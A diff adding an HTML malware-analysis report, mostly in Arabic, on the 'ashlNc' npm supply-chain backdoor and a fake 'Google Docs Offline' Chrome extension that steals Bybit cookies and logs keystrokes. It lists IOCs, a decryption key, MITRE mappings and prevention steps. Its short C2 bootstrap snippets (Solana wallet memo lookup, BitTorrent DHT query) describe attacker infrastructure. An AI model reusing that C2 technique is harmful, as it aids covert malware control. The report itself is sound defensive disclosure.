+        <span class="ref-num">14</span>
+        <a href="https://nodejs.org" target="_blank">Node.js v22.9.0 — Bundled runtime</a>
+      </li>
+      <li>
+        <span class="ref-num">15</span>
+        <a href="https://socket.io" target="_blank">Socket.IO — Real-time bidirectional C2 channel</a>
+      </li>
+      <li>
+        <span class="ref-num">16</span>
+        <a href="https://docs.npmjs.com/cli/v10/using-npm/scripts" target="_blank">npm scripts — How postinstall scripts work (and how to disable them)</a>
+      </li>
+      <li>
+        <span class="ref-num">17</span>
+        <a href="https://docs.npmjs.com/cli/v10/commands/npm-audit" target="_blank">npm audit — Security audit for npm packages</a>
+      </li>
+    </ul>
+  </div>
+
+  <div class="footer">
+    <p>Security Analysis Report — ashlNc Backdoor (GHSA-hxf3-5h5r-xr7c)</p>
+    <p>TLP:AMBER — This report may be shared within your organization with need-to-know basis.</p>
+    <p>Prepared: 2026-06-19 | Remediation: 2026-06-19 | Classification: CRITICAL</p>
+  </div>
+
+
+</div>
+</div>
+
+<div id="report-ar" class="report">
+<div class="container">
+
+
+  <!-- Header -->
+<div class="header">
+<span class="label" style="font-size:0.7em;text-transform:uppercase;letter-spacing:3px;color:var(--accent-red);font-weight:600;margin-bottom:16px;display:block;">تحليل امني — تقرير فني</span>
+<h1><span style="color:var(--accent-red);">ashlNc</span> Backdoor<br>تحليل باك دور متعدد الطبقات</h1>
+<p class="subtitle">
+هندسة عكسية كاملة لـ 3 طبقات تشفير (Base64 + AES-256-CBC + Webpack, 747KB) لاكتشاف باك دور Node.js متطور<br>
+يستخدم بلوكتشين سولانا وشبكة Kademlia DHT للتحكم اللامركزي — بدون عناوين IP ثابتة<br>
+اكتشاف إضافي: إضافة Chrome خبيثة تسرق حسابات Bybit وتسجل ضغطات لوحة المفاتيح
+</p>
+<div class="meta">
+<span>تاريخ التحليل: 19 يونيو 2026</span>
+<span>التصنيف: Backdoor / Infostealer / RAT</span>
+<span>CVE: GHSA-hxf3-5h5r-xr7c (مطلوب من GitHub CNA)</span>
+<span>الحالة: تم التنظيف — 19 يونيو 2026</span>
+</div>
+</div>
+
+<!-- Overview -->
+<div class="section">
+<h2><span class="accent-line"></span> نظرة عامة</h2>
+<p>
+هذا الباك دور متطور يخترق أجهزة Windows ويستخدم <strong>3 طبقات تشفير</strong> لإخفاء نفسه.
+يتميز بآلية اتصال لا مركزية باستخدام <strong>شبكة BitTorrent DHT</strong> و <strong>بلوكتشين سولانا</strong>،
+مما يجعله صعب الاكتشاف والتحليل. الباك قادر على سرقة كلمات المرور، الكوكيز، بيانات البطاقات الائتمانية،
+ومحافظ العملات الرقمية، بالإضافة إلى التحكم الكامل بالجهاز عن بعد.
+</p>
+<p>
+أثناء التحليل، تم اكتشاف <strong>3 إصابات منفصلة</strong> على نفس الجهاز:
+(1) باك دور ashlNc في مجلدات %APPDATA%،
+(2) إعلانات متصفح Nemotrix في الريجستري،
+(3) إضافة Chrome خبيثة تسجل كل ما تكتبه وتسرق حسابات Bybit.
+كلها تمت إزالتها بنجاح.
+</p>
+</div>
+
+<!-- System Clean -->
+<div class="section">
+<h2><span class="accent-line" style="background:var(--accent-green);"></span> حالة الجهاز — تم التنظيف</h2>
+<div class="success-box">
+<div class="success-title">تمت إزالة جميع الإصابات بنجاح — 2026-06-19</div>
+</div>
+
+<div class="grid">
+<div class="card">
+<div class="card-header">الإصابة 1 — ashlNc Backdoor</div>
+<span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,136,51,0.12);color:#44cc55;border:1px solid rgba(34,136,51,0.25);font-weight:600;">تمت الإزالة</span>
+<div class="card-value" style="margin-top:6px;">%APPDATA%\ashlNc\ — محذوف</div>
+<div class="card-value" style="margin-top:4px;">%LOCALAPPDATA%\ashlNc\ — محذوف</div>
+<div class="card-value" style="margin-top:4px;">%APPDATA%\_node_x86\ — محذوف</div>
+<div class="card-note">ريجستري vUVlUXNH محذوف، مهمة UpdateApp محذوفة</div>
+</div>
+<div class="card">
+<div class="card-header">الإصابة 2 — Nemotrix Adware</div>
+<span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,136,51,0.12);color:#44cc55;border:1px solid rgba(34,136,51,0.25);font-weight:600;">تمت الإزالة</span>
+<div class="card-value" style="margin-top:6px;">HKCU\...\Run\Tommy — محذوف</div>
+<div class="card-note">مفتاح اختطاف المتصفح المحول إلى nemotrix.org تم حذفه</div>
+</div>
+<div class="card">
+<div class="card-header">الإصابة 3 — إضافة Chrome "jucku"</div>
+<span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,136,51,0.12);color:#44cc55;border:1px solid rgba(34,136,51,0.25);font-weight:600;">تمت الإزالة</span>
+<div class="card-value" style="margin-top:6px;">Chrome\jucku\ — محذوف</div>
+<div class="card-note">إضافة تسجل ضغطات المفاتيح وتسرق حسابات Bybit</div>
+</div>
+<div class="card">
+<div class="card-header">فحص التحقق</div>
+<span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,136,51,0.12);color:#44cc55;border:1px solid rgba(34,136,51,0.25);font-weight:600;">ناجح</span>
+<div class="card-value" style="margin-top:6px;font-size:0.7em;">جميع مفاتيح الريجستري: نظيف<br>المهام المجدولة: نظيف<br>ملف hosts: نظيف<br>إعدادات البروكسي: نظيف<br>صفحات بدء المتصفح: نظيف</div>
+</div>
+</div>
+
+<p style="color:var(--text-muted);font-size:0.78em;margin-top:10px;">
+<strong style="color:var(--accent-green);">ملاحظة هامة</strong>: الإصابات الثلاث تمت إزالتها بالكامل. لكن الباك دور ينزل وحدات مشفرة إضافية أثناء التشغيل — الفورمات الكامل هو الحل الوحيد لضمان نظافة الجهاز 100%. غير كل كلمات السر من جهاز آخر فورا.
+</p>
+</div>
+
+<!-- Infection Timeline -->
+<div class="section">
+<h2><span class="accent-line"></span> سلسلة الإصابات</h2>
+
+<table class="data-table">
+<tr>
+<th>التاريخ</th>
+<th>الحدث</th>
+</tr>
+<tr>
+<td style="color:var(--accent-amber);">2026-03-11 07:23</td>
+<td><strong>إضافة Chrome "jucku" مثبتة</strong> — fake Google Docs Offline، تسرق الكريبتو</td>
+</tr>
+<tr>
+<td>2026-04-05 08:27</td>
+<td>تحميل ملف <code>Receipt.pdf</code> (ف possibly trojan)</td>
+</tr>
+<tr>
+<td style="color:var(--accent-red);">2026-04-05 08:37</td>
+<td><strong>تم استخراج مشروع npm مسموم</strong> — تطبيق Solid.js/Vite بحزم ملوثة</td>
+</tr>
+<tr>
+<td style="color:var(--accent-red);">2026-04-08 08:25</td>
+<td><strong>ملفات ashlNc تم إنشاؤها</strong> — الباك دور بدأ شغله</td>
+</tr>
+</table>
+</div>
+
+<!-- Root Cause -->
+<div class="section">
+<h2><span class="accent-line"></span> مصدر العدوى — npm Supply Chain Attack</h2>
+<p>
+العدوى جاءت من مشروع npm مسموم على سطح المكتب. هذا مشروع Node.js/Vite (React/Solid.js).
+عندما شغّلت <code>npm install</code>، إحدى الحزم (أو إحدى توابعها) كانت تحتوي على كود خبيث في <code>postinstall</code>
+ونصبت الباك دور في مجلدات <code>%APPDATA%</code>.
+</p>
+<p>
+جميع حزم npm المثبتة حاليا (<code>bun</code>، <code>corepack</code>، <code>npm</code>) هي <strong>أصلية وآمنة</strong>.
+الملفات التالية ماهي حزم نصب — <strong>هي ملفات خبيثة أنزلها المخترق</strong>:
+</p>
+<div class="grid">
+<div class="card">
+<div class="card-header">node.exe في _node_x86</div>
+<div class="card-value">موجود، لكنه Node.js حقيقي v22.9.0 مضمّن من المخترق</div>
+<div class="card-note">ما نصبت أنت هذا الملف — المخترق حطه عشان يشغل كوده الخبيث</div>
+</div>
+<div class="card">
+<div class="card-header">index.js في ashlNc</div>
+<div class="card-value">كود خبيث بثلاث طبقات تشفير</div>
+<div class="card-note">مش package — هذا الملف الخبيث الرئيسي</div>
+</div>
+<div class="card">
+<div class="card-header">PSprdrbPWq.ps1</div>
+<div class="card-value">سكربت باورشيل خبيث</div>
+<div class="card-note">يسجل في الريجستري ويحمي نفسه من الحذف</div>
+</div>
+<div class="card">
+<div class="card-header">إضافة Chrome "jucku"</div>
+<div class="card-value">إضافة متصفح خبيثة متنكرة</div>
+<div class="card-note">تسرق كلمات السر، الكوكيز، كل ما تكتبه</div>
+</div>
+</div>
+</div>
+
+<!-- Chrome Extension -->
+<div class="section">
+<h2><span class="accent-line"></span> إضافة Chrome "jucku" — محلل الإضافة الخبيثة</h2>
+<div class="card">
+<div class="card-header">هوية الإضافة</div>
+<div class="card-value">ID: haookbehcedinkhoekmkbjopifpheimj</div>
+<div class="card-value" style="margin-top:4px;">الاسم المزيف: "Google Docs Offline"</div>
+<div class="card-note">إضافة مزيفة — الإضافة الحقيقية ID: ghbmnnjooekpmoecnnnilnnbdlolhkhi</div>
+</div>
+
+<table class="data-table">
+<tr><th>الصلاحية</th><th>الاستخدام الخبيث</th></tr>
+<tr><td class="ar-col"><code>cookies</code></td><td class="ar-col">يسرق كوكيز تسجيل الدخول من <code>.bybit.com</code> — يتحكم بحسابات الكريبتو بدون كلمة سر</td></tr>
+<tr><td class="ar-col"><code>&lt;all_urls&gt;</code></td><td class="ar-col">يتسلل لكل المواقع — يسجل كل ضغطة لوحة مفاتيح، يصور صفحة DOM</td></tr>
+<tr><td class="ar-col"><code>clipboardRead</code></td><td class="ar-col">يسرق عناوين المحافظ الرقمية من الحافظة</td></tr>
+<tr><td class="ar-col"><code>tabs</code></td><td class="ar-col">يقرأ كل التبويبات المفتوحة وعناوينها</td></tr>
+<tr><td class="ar-col"><code>history</code></td><td class="ar-col">يسرق سجل التصفح</td></tr>
+<tr><td class="ar-col"><code>bookmarks</code></td><td class="ar-col">يقرأ الإشارات المرجعية</td></tr>
+<tr><td class="ar-col"><code>proxy</code></td><td class="ar-col">يقدر يوجه اتصالاتك عبر خادم المخترق</td></tr>
+</table>
+
+<div class="grid" style="margin-top:12px;">
+<div class="card">
+<div class="card-header">background.js (26KB)</div>
+<div class="card-value" style="font-size:0.7em;">مشفر — يتصل بشبكة Solana RPC، يسرق بيانات Bybit</div>
+<div class="card-note">يستخدم 11 خادم Solana RPC. يراقب <code>.bybit.com</code> ويسرق الكوكيز <code>sid</code> و <code>token</code></div>
+</div>
+<div class="card">
+<div class="card-header">content_script.js (17KB)</div>
+<div class="card-value" style="font-size:0.7em;">يحقن في كل صفحة تزورها</div>
+<div class="card-note">Keylogger يرسل كل ضغطة لوحة مفاتيح كل 5 ثواني. يصور الـ DOM. يقرأ الحافظة.</div>
+</div>
+</div>
+</div>
+
+<!-- C2 -->
+<div class="section">
+<h2><span class="accent-line"></span> آلية الاتصال (C2 Bootstrap)</h2>
+
+<div class="timeline">
+<div class="timeline-item">
+<div class="step">Stage 1 — Solana Blockchain</div>
+<p><code>getSignaturesForAddress("BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC")</code></p>
+<p class="card-note">يقرا الـ memos من محفظة سولانا — البلوكتشين يستخدم كـ DNS لا مركزي</p>
+</div>
+<div class="timeline-item">
+<div class="step">Stage 2 — Kademlia DHT</div>
+<p>
+<code>dht.bootstrap(["dht.libtorrent.org:25401", ...])</code><br>
+<code>dht.get(ea1b4260a83348243387d6cdfda3cd287e323958)</code>
+</p>
+<p class="card-note">يتصل بشبكة BitTorrent DHT وي lookup المفتاح العام — يسترجع الكونفج كـ JSON</p>
+</div>
+<div class="timeline-item">
+<div class="step">Stage 3 — Socket.IO WebSocket</div>
+<p>اتصال ثنائي مباشر مع C2 لتنفيذ الأوامر</p>
+</div>
+</div>
+</div>
+
+<!-- IOCs -->
+<div class="section">
+<h2><span class="accent-line"></span> مؤشرات الاختراق (IOCs)</h2>
+
+<table class="data-table">
+<tr>
+<th>النوع</th>
+<th>القيمة</th>
+</tr>
+<tr>
+<td class="ar-col">محفظة سولانا (C2)</td>
+<td>BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC</td>
+</tr>
+<tr>
+<td class="ar-col">مفتاح DHT</td>
+<td>ea1b4260a83348243387d6cdfda3cd287e323958</td>
+</tr>
+<tr>
+<td class="ar-col">سكربت PS1</td>
+<td>%LOCALAPPDATA%\ashlNc\PSprdrbPWq.ps1</td>
+</tr>
+<tr>
+<td class="ar-col">الحمولة الرئيسية</td>
+<td>%APPDATA%\ashlNc\index.js</td>
+</tr>
+<tr>
+<td class="ar-col">محرك Node.js</td>
+<td>%APPDATA%\_node_x86\node\node.exe</td>
+</tr>
+<tr>
+<td class="ar-col">مفتاح AES</td>
+<td>+gXPUFof0jaL+CwgdWZ1s2USORP9kUuH</td>
+</tr>
+<tr>
+<td class="ar-col">IV</td>
+<td>MGsYCjrJrIz8Egijy0mFxQ==</td>
+</tr>
+<tr>
+<td class="ar-col">ريجستري (ashlNc)</td>
+<td>HKCU\...\Run\vUVlUXNH</td>
+</tr>
+<tr>
+<td class="ar-col">ريجستري (Nemotrix)</td>
+<td>HKCU\...\Run\Tommy -> www.nemotrix.org</td>
+</tr>
+<tr>
+<td class="ar-col">مهمة مجدولة</td>
+<td>UpdateApp</td>
+</tr>
+<tr>
+<td class="ar-col">إضافة Chrome ID</td>
+<td>haookbehcedinkhoekmkbjopifpheimj</td>
+</tr>
+<tr>
+<td class="ar-col">مسار الإضافة</td>
+<td>%LOCALAPPDATA%\Google\Chrome\jucku\</td>
+</tr>
+</table>
+</div>
+
+<!-- MITRE ATT&CK -->
+<div class="section">
+<h2><span class="accent-line"></span> MITRE ATT&CK Mapping</h2>
+<table class="data-table">
+<tr><th>التكتيك</th><th>التقنية</th><th>ID</th></tr>
+<tr><td class="ar-col">Execution</td><td class="ar-col">Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td></tr>
+<tr><td class="ar-col">Execution</td><td class="ar-col">Command and Scripting Interpreter: Node.js</td><td>T1059.007</td></tr>
+<tr><td class="ar-col">Persistence</td><td class="ar-col">Scheduled Task</td><td>T1053.005</td></tr>
+<tr><td class="ar-col">Persistence</td><td class="ar-col">Browser Extensions</td><td>T1176</td></tr>
+<tr><td class="ar-col">Persistence</td><td class="ar-col">Registry Run Keys</td><td>T1547.001</td></tr>
+<tr><td class="ar-col">Defense Evasion</td><td class="ar-col">Obfuscated Files</td><td>T1027.013</td></tr>
+<tr><td class="ar-col">Credential Access</td><td class="ar-col">Steal Web Session Cookie</td><td>T1539</td></tr>
+<tr><td class="ar-col">Credential Access</td><td class="ar-col">Input Capture: Keylogging</td><td>T1056.001</td></tr>
+<tr><td class="ar-col">Collection</td><td class="ar-col">Clipboard Data</td><td>T1115</td></tr>
+<tr><td class="ar-col">Exfiltration</td><td class="ar-col">Exfiltration Over C2 Channel</td><td>T1041</td></tr>
+<tr><td class="ar-col">C2</td><td class="ar-col">Web Service: Solana Blockchain</td><td>T1583.001</td></tr>
+<tr><td class="ar-col">C2</td><td class="ar-col">Application Layer Protocol: WebSocket</td><td>T1071.001</td></tr>
+</table>
+</div>
+
+<!-- CVE -->
+<div class="section">
+<h2><span class="accent-line"></span> GHSA-hxf3-5h5r-xr7c / CVE</h2>
+<div class="card">
+<div class="card-header">GitHub Security Advisory</div>
+<div class="card-value">GHSA-hxf3-5h5r-xr7c</div>
+<div class="card-note">تم النشر في 2026-06-19. رقم CVE مطلوب من GitHub CNA — تحت الإصدار.</div>
+</div>
+<div class="grid" style="margin-top:12px;">
+<div class="card">
+<div class="card-header">CVSS Score</div>
+<div class="card-value">9.8 (Critical)</div>
+<div class="card-note">AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
+</div>
+<div class="card">
+<div class="card-header">نوع الثغرة</div>
+<div class="card-value">CWE-912: Backdoor</div>
+</div>
+</div>
+<div class="card" style="margin-top:12px;">
+<div class="card-header">رابط التقرير</div>
+<div class="card-value"><a href="https://github.com/Haitham8888/ashlNc-backdoor/security/advisories/GHSA-hxf3-5h5r-xr7c" target="_blank" style="color:var(--accent-blue);">github.com/Haitham8888/ashlNc-backdoor/security/advisories/GHSA-hxf3-5h5r-xr7c</a></div>
+</div>
+</div>
+
+<!-- Prevention -->
+<div class="section">
+<h2><span class="accent-line"></span> كيفية الوقاية من هجمات npm Supply Chain</h2>
+<div class="grid">
+<div class="card">
+<div class="card-header">1. افحص قبل التثبيت</div>
+<div class="card-value" style="font-size:0.7em;">npm audit / npm doctor</div>
+<div class="card-note">شغّل <code>npm audit</code> قبل تثبيت أي حزمة. استخدم <code>npm install --dry-run</code> لمعاينة الحزم.</div>
+</div>
+<div class="card">
+<div class="card-header">2. أوقف postinstall scripts</div>
+<div class="card-value" style="font-size:0.7em;">npm config set ignore-scripts true</div>
+<div class="card-note">هذه هي الطريقة التي تم بها اختراقك. امنع تشغيل السكربتات التلقائية.</div>
+</div>
+<div class="card">
+<div class="card-header">3. استخدم حاويات للتطوير</div>
+<div class="card-value" style="font-size:0.7em;">Docker / VM</div>
+<div class="card-note">شغّل <code>npm install</code> داخل Docker Containers — لو حصل اختراق يبقى محصور.</div>
+</div>
+<div class="card">
+<div class="card-header">4. راجع package-lock.json</div>
+<div class="card-value" style="font-size:0.7em;">npm ci في الإنتاج</div>
+<div class="card-note">استخدم <code>npm ci</code> بدل <code>npm install</code> — يحترم ملف القفل ويفشل لو فيه تغيير.</div>
+</div>
+</div>
+<p class="card-note" style="margin-top:12px;">
+<strong>سبب الاختراق بالتحديد</strong>: المشروع المخترق كان تطبيق Solid.js/Vite من مصدر غير موثوق. دائما تحقق من مصدر أي مشروع قبل تشغيل <code>npm install</code>. افحص commit history والمطورين.
+</p>
+</div>
+
+<!-- Tweet -->
+<div class="section">
+<h2><span class="accent-line"></span> تغريدة للابلاغ</h2>
+<div class="tweet-box">
+<p class="tweet-ar">
+تحذير امني عاجل
+
+اكتشفت حملة اختراق متطورة على جهازي:
+"ashlNc Backdoor"
+
+التفاصيل:
+1- يستخدم باورشيل مخفي + Node.js مع 3 طبقات تشفير
+2- يستخدم بلوكتشين سولانا لايجاد الـ C2 — ما يحتاج سيرفر ثابت
+3- شبكة DHT (بت تورنت) عشان ما ينكشف عنوان المخترق
+4- إضافة Chrome خبيثة تسجل كل ضغطات الكيبورد وتسرق حسابات Bybit
+5- يسرق: كلمات السر، الكوكيز، البطاقات، محافظ العملات الرقمية
+
+المؤشرات:
+- محفظة سولانا: BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC
+- DHT Key: ea1b4260a83348243387d6cdfda3cd287e323958
+- GHSA: GHSA-hxf3-5h5r-xr7c
+
+الوقاية:
+- عطل npm postinstall scripts: npm config set ignore-scripts true
+- استخدم Docker للتطوير
+- افحص الحزم قبل التثبيت
+
+انشروا التوعية
+#امن_سيبراني #اختراق #npm #توعية
+</p>
+<a class="tweet-btn" href="https://twitter.com/intent?text=%D8%AA%D8%AD%D8%B0%D9%8A%D8%B1%20%D8%A7%D9%85%D9%86%D9%8A%20%D8%B9%D8%A7%D8%AC%D9%84%20%0A%D8%A7%D9%83%D8%AA%D8%B4%D9%81%D8%AA%20%D8%AD%D9%85%D9%84%D8%A9%20%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82%20%D9%85%D8%AA%D8%B7%D9%88%D8%B1%D8%A9%20%D8%B9%D9%84%D9%89%20%D8%AC%D9%87%D8%A7%D8%B2%D9%8A%3A%0A%E2%80%9CashlNc%20Backdoor%E2%80%9D%0A%0A%D8%A7%D9%84%D8%AA%D9%81%D8%A7%D8%B5%D9%8A%D9%84%3A%0A1-%20%D9%8A%D8%B3%D8%AA%D8%AE%D8%AF%D9%85%20%D8%A8%D8%A7%D9%88%D8%B1%D8%B4%D9%8A%D9%84%20%D9%85%D8%AE%D9%81%D9%8A%20%2B%20Node.js%20%D9%85%D8%B9%203%20%D8%B7%D8%A8%D9%82%D8%A7%D8%AA%20%D8%AA%D8%B4%D9%81%D9%8A%D8%B1%0A2-%20%D9%8A%D8%B3%D8%AA%D8%AE%D8%AF%D9%85%20%D8%A8%D9%84%D9%88%D9%83%D8%AA%D8%B4%D9%8A%D9%86%20%D8%B3%D9%88%D9%84%D8%A7%D9%86%D8%A7%20%D9%84%D8%A7%D9%8A%D8%AC%D8%A7%D8%AF%20%D8%A7%D9%84%D9%80%20C2%0A3-%20%D8%B4%D8%A8%D9%83%D8%A9%20DHT%20(%D8%A8%D8%AA%20%D8%AA%D9%88%D8%B1%D9%86%D8%AA)%20%D9%84%D8%A7%D8%AE%D9%81%D8%A7%D8%A1%20%D8%B9%D9%86%D9%88%D8%A7%D9%86%20%D8%A7%D9%84%D9%85%D8%AE%D8%AA%D8%B1%D9%82%0A4-%20%D8%A5%D8%B6%D8%A7%D9%81%D8%A9%20Chrome%20%D8%AA%D8%B3%D8%AC%D9%84%20%D9%83%D9%84%20%D8%B6%D8%BA%D8%B7%D8%A7%D8%AA%20%D8%A7%D9%84%D9%83%D9%8A%D8%A8%D9%88%D8%B1%D8%AF%20%D9%88%D8%AA%D8%B3%D8%B1%D9%82%20%D8%AD%D8%B3%D8%A7%D8%A8%D8%A7%D8%AA%20Bybit%0A5-%20%D9%8A%D8%B3%D8%B1%D9%82%3A%20%D9%83%D9%84%D9%85%D8%A7%D8%AA%20%D8%A7%D9%84%D8%B3%D8%B1%D8%8C%20%D8%A7%D9%84%D9%83%D9%88%D9%83%D9%8A%D8%B2%D8%8C%20%D9%85%D8%AD%D8%A7%D9%81%D8%B8%20%D8%A7%D9%84%D8%B9%D9%85%D9%84%D8%A7%D8%AA%0A%0A%D8%A7%D9%84%D9%85%D8%A4%D8%B4%D8%B1%D8%A7%D8%AA%3A%0A-%20%D9%85%D8%AD%D9%81%D8%B8%D8%A9%20%D8%B3%D9%88%D9%84%D8%A7%D9%86%D8%A7%3A%20BjVeAjPrSKFiingBn4vZvghsGj9KCE8AJVtbc9S8o8SC%0A-%20DHT%20Key%3A%20ea1b4260a83348243387d6cdfda3cd287e323958%0A-%20GHSA%3A%20GHSA-hxf3-5h5r-xr7c%0A%0A%D8%A7%D9%84%D9%88%D9%82%D8%A7%D9%8A%D8%A9%3A%0A-%20%D8%B9%D8%B7%D9%84%20npm%20postinstall%20scripts%3A%20npm%20config%20set%20ignore-scripts%20true%0A-%20%D8%A7%D8%B3%D8%AA%D8%AE%D8%AF%D9%85%20Docker%20%D9%84%D9%84%D8%AA%D8%B7%D9%88%D9%8A%D8%B1%0A-%20%D8%A7%D9%81%D8%AD%D8%B5%20%D8%A7%D9%84%D8%AD%D8%B2%D9%85%20%D9%82%D8%A8%D9%84%20%D8%A7%D9%84%D8%AA%D8%AB%D8%A8%D9%8A%D8%AA%0A%0A%D8%A7%D9%86%D8%B4%D8%B1%D9%88%D8%A7%20%D8%A7%D9%84%D8%AA%D9%88%D8%B9%D9%8A%D8%A9%0A%23%D8%A7%D9%85%D9%86_%D8%B3%D9%8A%D8%A8%D8%B1%D8%A7%D9%86%D9%8A%20%23%D8%A7%D8%AE%D8%AA%D8%B1%D8%A7%D9%82%20%23npm%20%23%D8%AA%D9%88%D8%B9%D9%8A%D8%A9" target="_blank">انشر في تويتر</a>
+</div>
+</div>
+
+<div class="footer">
+<p>تم اعداد هذا التقرير بواسطة باحث امن سيبراني — 19 يونيو 2026</p>
+<p>GHSA-hxf3-5h5r-xr7c | إزالة كاملة: 19 يونيو 2026</p>
+<p>نشر التوعية وحماية المجتمع الرقمي</p>
+</div>
+
+
+</div>
+</div>
+
+<script>
+function switchLang(lang) {
+  document.querySelectorAll('.report').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.lang-btn').forEach(el => el.classList.remove('active'));
+  document.getElementById('report-' + lang).classList.add('active');
+  document.querySelectorAll('.lang-btn').forEach(el => {
+    if (el.textContent.trim() === (lang === 'en' ? 'English' : 'العربية')) el.classList.add('active');
+  });
+}
+</script>
+
+</body>
+</html>
